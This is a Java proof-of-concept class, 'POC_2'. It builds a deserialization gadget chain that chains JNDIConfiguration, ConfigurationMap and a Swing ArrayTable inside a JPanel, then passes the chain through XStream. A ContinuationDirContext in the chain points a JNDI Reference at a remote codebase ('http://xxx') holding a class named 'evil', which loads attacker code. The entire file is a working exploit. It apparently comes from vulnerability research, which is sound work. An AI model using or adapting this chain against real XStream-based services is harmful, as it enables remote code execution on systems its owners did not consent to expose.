package com.example.CC;

import com.example.Utils.*;
import org.apache.commons.configuration.Configuration;
import org.apache.commons.configuration.JNDIConfiguration;
import org.apache.commons.logging.impl.NoOpLog;

import javax.naming.CannotProceedException;
import javax.naming.Reference;
import javax.naming.directory.DirContext;
import javax.swing.*;
import java.lang.reflect.Constructor;
import java.util.Collections;
import java.util.Hashtable;

public class POC_2 {

    /***
     * run with jComponent_equals.jar
     */

    public static void main(String[] args) throws Exception {

        DirContext ctx = makeContinuationContext("http://xxx", "evil");
        JNDIConfiguration jc = new JNDIConfiguration();
        jc.setContext(ctx);
        jc.setPrefix("foo");

        ReflectionUtil.setField(jc, "errorListeners", Collections.EMPTY_LIST);
        ReflectionUtil.setField(jc, "listeners", Collections.EMPTY_LIST);
        ReflectionUtil.setField(jc, "log", new NoOpLog());

        Class<?> cl = Class.forName("org.apache.commons.configuration.ConfigurationMap");
        Constructor<?> cons = cl.getDeclaredConstructor(Configuration.class);
        cons.setAccessible(true);
        Object configurationMap1 = cons.newInstance(jc);
        Object configurationMap2 = cons.newInstance(jc);

        JPanel j = new JPanel();
        Class atClass = Class.forName("javax.swing.ArrayTable");
        Object arrayTable = ReflectionUtil.createWithoutConstructor(atClass);
        Object[] table = new Object[]{configurationMap1, "1", configurationMap2, "2"};

        ReflectionUtil.setField(arrayTable, "table", table);
        ReflectionUtil.setField(j, "clientProperties", arrayTable);

        XStreamUtil.deserialize(XStreamUtil.serialize(j));
    }

    public static DirContext makeContinuationContext(String codebase, String clazz) throws Exception {
        Class<?> ccCl = Class.forName("javax.naming.spi.ContinuationDirContext"); //$NON-NLS-1$
        Constructor<?> ccCons = ccCl.getDeclaredConstructor(CannotProceedException.class, Hashtable.class);
        ccCons.setAccessible(true);
        CannotProceedException cpe = new CannotProceedException();
        ReflectionUtil.setField(cpe, "stackTrace", new StackTraceElement[0]);
        cpe.setResolvedObj(new Reference("Foo", clazz, codebase));
        return (DirContext) ccCons.newInstance(cpe, null);
    }

}